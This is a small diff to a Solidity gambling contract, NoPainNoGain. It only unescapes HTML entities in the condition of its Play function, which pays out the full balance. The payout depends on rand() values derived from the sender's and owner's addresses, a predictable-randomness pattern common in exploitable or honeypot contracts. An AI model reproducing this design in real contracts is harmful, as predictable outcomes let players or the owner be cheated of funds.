@@ -12,7 +12,7 @@ contract NoPainNoGain {
     }
     
     function Play(uint n) public payable {
-        if(rand(msg.sender) * n &lt; rand(Owner) &amp;&amp; msg.value &gt;= this.balance &amp;&amp; msg.value &gt; 0.25 ether)
+        if(rand(msg.sender) * n < rand(Owner) && msg.value >= this.balance && msg.value > 0.25 ether)
             // You have to risk as much as the contract do
             msg.sender.transfer(this.balance+msg.value);
     }
